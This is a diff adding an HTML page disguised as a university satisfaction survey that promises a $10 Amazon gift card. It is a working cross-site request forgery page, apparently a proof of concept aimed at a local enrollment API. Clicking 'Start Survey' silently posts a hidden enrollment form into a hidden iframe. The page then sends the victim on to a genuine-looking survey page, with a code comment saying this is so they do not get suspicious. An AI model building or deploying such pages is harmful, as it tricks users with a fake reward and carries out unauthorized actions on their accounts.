@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>University Student Satisfaction Survey 2025</title>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; background: #f4f7f6; color: #333; text-align: center; padding: 50px; }
+        .card { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); display: inline-block; max-width: 500px; }
+        .btn { background: #007bff; color: white; padding: 12px 25px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; text-decoration: none; }
+        .btn:hover { background: #0056b3; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <img src="https://via.placeholder.com/150x50?text=UNIVERSITY+LOGO" alt="Logo">
+        <h2>We Value Your Feedback!</h2>
+        <p>Complete this 2-minute survey about the new course registration portal to receive a <b>$10 Amazon Gift Card</b>.</p>
+        <br>
+        <button class="btn" onclick="launchAttack()">Start Survey</button>
+    </div>
+
+    <div style="display: none;">
+        <form id="csrf-form" action="http://localhost:8000/api/v1/enrollments" method="POST" target="hidden-frame">
+            <input type="hidden" name="course_id" value="1" />
+            <input type="hidden" name="student_id" value="2" />
+        </form>
+        <iframe name="hidden-frame"></iframe>
+    </div>
+
+    <script>
+        function launchAttack() {
+            // 1. Submit the hidden enrollment form silently
+            document.getElementById('csrf-form').submit();
+            
+            // 2. Redirect the user to a real-looking survey so they don't get suspicious
+            setTimeout(() => {
+                window.location.href = "https://www.google.com/forms/about/";
+            }, 500);
+        }
+    </script>
+</body>
+</html>
